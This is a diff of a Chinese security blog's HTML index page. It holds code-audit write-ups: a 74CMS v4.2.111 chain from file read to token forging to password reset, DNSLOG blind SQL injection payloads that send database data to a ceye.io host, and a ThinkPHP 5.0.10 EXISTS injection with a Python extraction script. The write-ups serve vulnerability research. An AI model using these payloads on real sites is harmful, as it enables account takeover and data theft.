+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
+                2018-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
+<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
+<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
+<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
+<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
+<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
+</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
+<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
+// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
+// 经过 passport_key() 函数处理后的返回值
+$txt = passport_key(base64_decode($txt), $key);
+// 变量初始化
+$tmp = &apos;&apos;;
+// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
+for ($i = 0; $i &lt; strlen($txt); $i++) {
+    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
+    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
+    $tmp .= $txt[$i] ^ $txt[++$i];
+}
+// 返回 $tmp 的值作为结果
+return $tmp;
+</code></pre><p>}</p>
+<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
+<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
+<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
+<p>可看到修改成功。</p>
+<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
+<p>4.现在利用漏洞就很简单了</p>
+<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
+</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
+<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
+<p>2.我们本地加密得到<code>token</code>:</p>
+<pre><code>#demo.php
+&lt;?php
+
+function get_token($pwdhash){
+    $token = encrypt($pwdhash,$pwdhash);
+    var_dump($token);
+
+}
+function encrypt($txt, $key = &apos;_qscms&apos;) {
+    ...
+}
+function passport_key($txt, $encrypt_key) {
+   ...
+}
+
+$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
+$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
+get_token($data[&apos;PWDHASH&apos;]);
+?&gt;
+</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
+<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1564,893 +2437,6 @@ elseif($setp == 2)
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/26/利用DNSLOG快速获取数据(盲注)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/26/利用DNSLOG快速获取数据(盲注)/" itemprop="url">渗透技巧 |  利用DNSLOG快速获取数据(盲注)</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-26T09:26:41+08:00">
-                2018-09-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>DNS注入就是通过数据库对域名发起dns解析请求来达到快速获取数据目的</p>
-</blockquote>
-<hr>
-<p>1.先介绍下mysql的<code>load_file()</code>函数:</p>
-<blockquote>
-<p><strong>LOAD_FILE(file_name)</strong><br>读取文件并返回文件内容为字符串。要使用此函数,文件必须位于服务器主机上,必须指定完整路径的文件,而且必须有FILE权限。<br>该文件所有字节可读,但文件内容必须小于<strong>max_allowed_packet</strong>。 如果该文件不存在或无法读取,因为前面的条件之一不满足,函数返回<br>NULL。 在MySQL 5.0.19,<strong>character_set_filesystem</strong>系统变量控制文件名的解释,即仅作文字字符串。</p>
-</blockquote>
-<p>读取文件:<br><img src="http://static.zybuluo.com/chhyx/uwgzjrbxxkbuqhfv1w6u7xcy/image_1co8h76to15971pu6akagogf4k19.png" alt="image_1co8h76to15971pu6akagogf4k19.png-16.7kB"></p>
-<p>实际上<code>load_file()</code>函数还可以用来发送dns解析请求<br><img src="http://static.zybuluo.com/chhyx/3z50i936q7geyodeq99buky1/image_1co8poe7gcta1tov1vfl19tgsrt6i.png" alt="image_1co8poe7gcta1tov1vfl19tgsrt6i.png-24.3kB"></p>
-<p>而这就是dns注入的<strong>关键</strong></p>
-<p>2.存在局限:<br>A.<code>load_file</code>函数在<code>Linux</code>下是无法用来做<code>dnslog</code>攻击的，因为在这里就涉及到<code>Windows</code>的一个小Tips——<code>UNC路径</code>,我们看下UNC在百度上的解释:</p>
-<p><img src="http://static.zybuluo.com/chhyx/k3kx7dz4o3yyg4wr2famxmbl/image_1co9pm7mstkmdbr1fbp1l9155s69.png" alt="image_1co9pm7mstkmdbr1fbp1l9155s69.png-48.1kB"></p>
-<p>sql语句:</p>
-<pre><code>select load_file(&apos;\\\\test.xxxx.ceye.io\\abc&apos;);
-</code></pre><p>这就解释了为什么在mysql中运行<code>concat()</code>函数拼接了4个<code>\</code>了,因为转义 4个<code>\</code>变成了2个<code>\</code>,目的就是利用UNC路径。因为Linux没有UNC路径这个东西 所以不能使用这种方式外带数据</p>
-<p>B.MySQL数据库配置中要设置<code>secure_file_priv</code>为空,才能完整的去请求<code>DNS</code><br>在<code>mysql.ini</code>设置:<br><img src="http://static.zybuluo.com/chhyx/bdr8rjiu9seakpet2dgceqr6/image_1co9nblsueuq13uj1lce183d0b13.png" alt="image_1co9nblsueuq13uj1lce183d0b13.png-45.3kB"></p>
-<p>查看设置:<br><img src="http://static.zybuluo.com/chhyx/g70wz91gxlp9ogusj8n5zc8z/image_1co9n8b6h1f821uc6lg0vokai19.png" alt="image_1co9n8b6h1f821uc6lg0vokai19.png-11.8kB"></p>
-<pre><code>当secure_file_priv为空，就可以读取磁盘的目录。
-当secure_file_priv为G:\，就可以读取G盘的文件。
-当secure_file_priv为null，load_file就不能加载文件。
-</code></pre><p>3.使用<code>dns注入</code>需要注意:</p>
-<pre><code>a.网站必须运行在`Windows`平台上
-b.MySQL中的`secure_file_priv`必须为空
-c.域名前缀长度限制在63个字符,解决办法是用mid()函数来获取。
-d.域名前缀不支持一些特殊字符,如*,解决办法是用hex()或者其他加密函数,获取到数据后再解密。
-e.sqlmap也提供了这种注入方法,参数：`–dns-domain`
-</code></pre><p>4.实战:<br>咱们以笔者昨天分析的TP5.0.10的一处盲注为例子,具体看<br>A.获取数据库名:<br>payload:</p>
-<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select hex(database())),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/qylgxwd143p8unipijf5iwaa/image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png" alt="image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png-48.7kB"></p>
-<p>dnslog平台收到:<br><img src="http://static.zybuluo.com/chhyx/8h5103qsd2tpj5h285at60yo/image_1co9r8lts151317bj124o1coec0673.png" alt="image_1co9r8lts151317bj124o1coec0673.png-17.6kB"></p>
-<p>paylaod解释:</p>
-<pre><code>concat 将字符串拼接
-database()  数据库查询语句
-hex()   hex加密 防止数据库有特殊字符传不出来
-.xxxx.ceye.io\abc  dnslog平台给的域名
-这里拼接起来是:load_file(&apos;\\\\\\\\ tp.xxxx.ceye.io\\abc&apos;),相当于访问了带有数据库名称的三级域名,被dns捕捉到了
-</code></pre><p>B.获取表信息:<br>payload:</p>
-<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;tp&apos; limit 0,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
-</code></pre><p>通过改变limit 0,1来一个一个解析(limit 1,1、limit 2,1)<br>第一张表:<br><img src="http://static.zybuluo.com/chhyx/1ha3t6253yavexd5sm7ob31t/image_1co8lqvgd1k87all4a8a5f18302g.png" alt="image_1co8lqvgd1k87all4a8a5f18302g.png-15.1kB"></p>
-<p>第二张表:<br><img src="http://static.zybuluo.com/chhyx/c1948vsz89c04qyzla4uzzg0/image_1co8lt5hbua1v5m18dc1hbd5dt2t.png" alt="image_1co8lt5hbua1v5m18dc1hbd5dt2t.png-14.5kB"></p>
-<p>C:获取<code>gather</code>表内的字段名:</p>
-<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select column_name from information_schema.columns where table_name = &apos;gather&apos; limit 1,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/hm6avbqq4034mn0v9tqxlkgk/image_1co8mbnnc1iupko85c51cvu1k8e3n.png" alt="image_1co8mbnnc1iupko85c51cvu1k8e3n.png-6.4kB"><br><img src="http://static.zybuluo.com/chhyx/167hww2kvi3mwsabu0o90z2r/image_1co8mb1376kg3o2mv19fj1gr73a.png" alt="image_1co8mb1376kg3o2mv19fj1gr73a.png-6.5kB"><br><img src="http://static.zybuluo.com/chhyx/gt3mzhhv7vqb99s298bv3feu/image_1co8mcsk61b1ur6o11j1nervde44.png" alt="image_1co8mcsk61b1ur6o11j1nervde44.png-6kB"></p>
-<p>D.获取3个字段的的数据:</p>
-<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select username from gather limit 0,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)  //username gather_waf id
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/dt558yb8dyxzlcctnbwos9j1/image_1co8pd457cnc15tmhm1o7g13h85b.png" alt="image_1co8pd457cnc15tmhm1o7g13h85b.png-6kB"><br><img src="http://static.zybuluo.com/chhyx/pm64dlz4zw95k9grz83oj8xb/image_1co8pbp53ra3qv81qtu18u0ou84u.png" alt="image_1co8pbp53ra3qv81qtu18u0ou84u.png-6.8kB"><br><img src="http://static.zybuluo.com/chhyx/4zkcoqwoch8t9b57matnxrru/image_1co8pf4hsouq167e1pdsi6qa705o.png" alt="image_1co8pf4hsouq167e1pdsi6qa705o.png-5.7kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/6n3qvx9jkec1utlw8r58qj2x/image_1co8pfq2417i88stpo21m5794665.png" alt="image_1co8pfq2417i88stpo21m5794665.png-10.2kB"></p>
-<p>相比于通过猜解获取信息,用dnslog算是挺高效的。虽然利用条件不算宽松,但是技巧还是值得学习的。 </p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注/" itemprop="url">代码审计 |  thinkphp5.0.10函数过滤不全导致一处盲注</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T09:15:41+08:00">
-                2018-09-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>跟着P师傅后面捡洞不容易,洞虽然撞了,但毕竟是自己审出来的,还是分析记录一波</p>
-</blockquote>
-<hr>
-<p>##<strong>1.基础知识:</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
-<p>##<strong>2.环境搭建:</strong><br>A.index.php</p>
-<pre><code>#application\index\controller\Index.php
-&lt;?php
-namespace app\index\controller;
-use think\Db;
-use think\Controller;
-class Index extends Controller
-{
-    public function index()
-    {
-        $post_user = input(&apos;post.user/a&apos;);
-        $a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
-        var_dump($a);
-    }
-}
-</code></pre><p>B.对应数据库下新建表<code>user</code>  <code>gather</code></p>
-<p><strong>3.漏洞利用:</strong><br>payload：</p>
-<pre><code>post:
-user[0]=EXISTS&amp;user[1]=select * from user where 1=1  √
-user[0]=EXISTS&amp;user[1]=select * from user where 1=2  ×
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/79u46kfp4fetv0n47w75geqi/image_1co76r19t151vpd83b721qq4r5i.png" alt="image_1co76r19t151vpd83b721qq4r5i.png-42.8kB"><br><img src="http://static.zybuluo.com/chhyx/kbnpxx1fq21u73e3x3rxgmvz/image_1co76sdqv1svb13ae158d1g3l7tl6c.png" alt="image_1co76sdqv1svb13ae158d1g3l7tl6c.png-35.7kB"></p>
-<p>##<strong>4.代码审计:</strong><br><strong>造成漏洞的原因与上篇文章一样,都是函数过滤不全导致的注入问题</strong><br>首先从<code>index.php</code>开始分析:</p>
-<pre><code>$a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
-</code></pre><p>A.跟进<code>thinkphp\library\think\db\Query.php</code>的<code>select()</code>函数:</p>
-<pre><code>#thinkphp\library\think\db\Query.php 2290行
-public function select($data = null)
-...
-if (false === $resultSet) {
-        // 生成查询SQL
-        $sql = $this-&gt;builder-&gt;select($options);
-        // 获取参数绑定
-        $bind = $this-&gt;getBind();
-...
-</code></pre><p>B.跟进<code>thinkphp\library\think\db\bulider.php</code>的<code>select()</code>函数</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 692行
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/b7xufwpqmq4qphlyytfivelj/image_1co76e4lql0519tvp9f10inbd648.png" alt="image_1co63sh5e1locbbe1l3epu38hqm.png-91.1kB"></p>
-<p>C.跟进<code>parseWhere()</code>函数:</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 224行
-protected function parseWhere($where, $options)
-{   
-    $whereStr = $this-&gt;buildWhere($where, $options);//跟进
-    if (!empty($options[&apos;soft_delete&apos;])) {
-        // 附加软删除条件
-        list($field, $condition) = $options[&apos;soft_delete&apos;];
-        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
-        $whereStr = $whereStr ? &apos;( &apos; . $whereStr . &apos; ) AND &apos; : &apos;&apos;;
-        $whereStr = $whereStr . $this-&gt;parseWhereItem($field, $condition, &apos;&apos;, $options, $binds);
-    }
-    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
-}
-</code></pre><p>D.跟进<code>buildWhere()</code>函数</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 245行
-public function buildWhere($where, $options)
-    { 
-    ...
-    $whereStr = &apos;&apos;;
-    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
-        foreach ($where as $key =&gt; $val) {
-            $str = [];
-......
-else {//进入
-                    // 对字段使用表达式查询
-    $field = is_string($field) ? $field : &apos;&apos;;
-    $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
-
- }
-        }
-
-        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
-    }
-
-    return $whereStr;
-</code></pre><p>E.跟进核心函数<code>parseWhereItem()</code>：</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 300行
-protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
-    {
-    ...
-    // 检测操作符
-    if (!in_array($exp, $this-&gt;exp)) {//进入
-        $exp = strtolower($exp);
-        if (isset($this-&gt;exp[$exp])) {
-            $exp = $this-&gt;exp[$exp];
-            //$exp:EXISTS
-        } 
-    ...
-    $whereStr = &apos;&apos;;
-    ...
-    //exists操作有关代码
-    elseif (in_array($exp, [&apos;NOT EXISTS&apos;, &apos;EXISTS&apos;])) {
-        //$exp:EXISTS  $value:select * from user where 1=1
-        if ($value instanceof \Closure) {
-            $whereStr .= $exp . &apos; &apos; . $this-&gt;parseClosure($value);
-        } else {
-            $whereStr .= $exp . &apos; (&apos; . $value . &apos;)&apos;;
-            //$whereStr:EXISTS (select * from user where 1=1
-        }
-</code></pre><p>可以看到我们TP框架并没有对我们传输进去的<code>$value</code>进行过滤 而直接拼接到<code>$whereStr</code>变量 最后拼接到<code>$sql</code>语句中 导致注入</p>
-<p>F.我们看下tp框架系统核心函数之一的<code>input()</code>函数,它的功能是帮助我们获取各种变量及自动过滤:<br>我们跟进<code>thinkphp\library\think\Requests.php</code>的<code>input()</code>函数：<br>我们查看过滤器相关代码:</p>
-<pre><code>#thinkphp\library\think\Requests.php 971行
-public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)
-...   
-$filter = $this-&gt;getFilter($filter, $default);
-if (is_array($data)) {
-    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);
-    reset($data);
-} else {
-    $this-&gt;filterValue($data, $name, $filter);
-}
-
-if (isset($type) &amp;&amp; $data !== $default) {
-    // 强制类型转换
-    $this-&gt;typeCast($data, $type);
-}
-return $data;
-</code></pre><p>G.这里判断了变量是否为数组 这里调用了<code>filterValue()</code>函数进行过滤 跟进函数:</p>
-<pre><code>#thinkphp\library\think\Requests.php 1054行
-private function filterValue(&amp;$value, $key, $filters)
-{
-...
-return $this-&gt;filterExp($value);
-}
-</code></pre><p>跟进<code>filterExp()</code>函数:</p>
-<pre><code>public function filterExp(&amp;$value)
-{
-// 过滤查询特殊字符
-if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) {
-    $value .= &apos; &apos;;
-}
-// TODO 其他安全过滤
-}
-</code></pre><p>H.这个函数的作用很简单,判断传进来的表达式是否属于敏感关键字,如果是—&gt;关键字后加空格,来进行给过滤<br>如传进来的post数据:</p>
-<pre><code>x[0]=in&amp;x[1]=1
-</code></pre><p>服务器接收时如果没有进行过滤:</p>
-<pre><code>$date[&apos;x&apos;] = array(&apos;in&apos;=&gt;&apos;1&apos;)
-</code></pre><p>如果被<code>filterExp()</code>过滤后:</p>
-<pre><code>$date[&apos;x&apos;] = array(&apos;in &apos;=&gt;&apos;1&apos;)
-</code></pre><p>这样就无法被服务器解析 也就避免了漏洞</p>
-<p>I.但是因为TP5重写了数据库操作的方法,忽略了一些敏感操作 导致我们可以绕过TP的过滤机制</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 重写表达式
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_1co76cjk27kqo00i3auj21f3l3c.png-52.1kB"></p>
-<pre><code>#thinkphp\library\think\Requests.php  过滤表达式
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/b7xufwpqmq4qphlyytfivelj/image_1co76e4lql0519tvp9f10inbd648.png" alt="image_1co76e4lql0519tvp9f10inbd648.png-23.4kB"></p>
-<p>我们可看到这里并没有对<code>exists</code>、<code>NOT EXISTS</code>、<code>notexists</code>等表达式进行过滤,导致了注入。</p>
-<p>这里写了一个py盲注出数据表的脚本:</p>
-<pre><code>#!/usr/bin/python
-# encoding: utf-8
-import requests
-
-string = &apos;abcdefghijklmnopqrstuvwxyzAbCDEFGHIJKLMNOPQRSTUVWXYZ_&apos;
-url = &apos;http://127.0.0.1:82/public/index.php/index/index/index&apos;
-headers = {
-&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0)       Gecko/20100101 Firefox/46.0&apos;,
-&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;
-}    
-//传入table的长度即可
-def get_table_name(table_length):
-result_table_name = &apos;&apos;
-flag = 0
-for i in range(0,table_length+1):
-    if flag:
-        break;
-    for char in string:
-        data=&apos;&apos;&apos;user[0]=EXISTS&amp;user[1]=select * from user where (SELECT 1 FROM information_schema.tables WHERE 
-            TABLE_SCHEMA=&quot;tp&quot; AND table_name REGEXP &apos;^%s[a-z]&apos; LIMIT 0,1)&apos;&apos;&apos;%(result_table_name+char)
-        re = requests.post(url,data=data,headers=headers)
-        if &apos;array(3)&apos; in re.text and re.status_code == 200:
-            result_table_name += char
-            print &apos;result_table_name:&apos;+result_table_name
-            if(i == table_length-2):
-                for chr2 in string:
-                    data = &apos;&apos;&apos;user[0]=EXISTS&amp;user[1]=select * from user where (SELECT 1 FROM information_schema.tables WHERE 
-                                TABLE_SCHEMA=&quot;tp&quot; AND table_name REGEXP &apos;^%s[a-%s]&apos; LIMIT 0,1)&apos;&apos;&apos;%(result_table_name,chr2)
-                    re = requests.post(url,data=data,headers=headers)
-                    if &apos;array(3)&apos; in re.text and re.status_code == 200:
-                        result_table_name += chr2
-                        print &apos;result_table_name:&apos;+result_table_name
-                        break
-            flag = 0
-            break
-print &apos;[+]result_table_name:&apos;+result_table_name    
-
-get_table_name(6)//运行函数
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/ccs5d8sokh6yvo2gd578o95r/image_1co7pdni110vd2731um1p352fr9.png" alt="image_1co7pdni110vd2731um1p352fr9.png-107.4kB"></p>
-<p>由于笔者对sql注入不是很擅长,等有时间总结一波再返回来再改脚本。</p>
-<p><strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118044</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/thinkphp5.0.10函数过滤不全导致注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/25/thinkphp5.0.10函数过滤不全导致注入/" itemprop="url">代码审计 |  thinkphp5.0.10函数过滤不全导致注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T08:15:41+08:00">
-                2018-09-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>中秋过了,博客开始更新,这两天审计TP框架,跟着P师傅的思路发现了一些问题,这里分析记录一波</p>
-</blockquote>
-<hr>
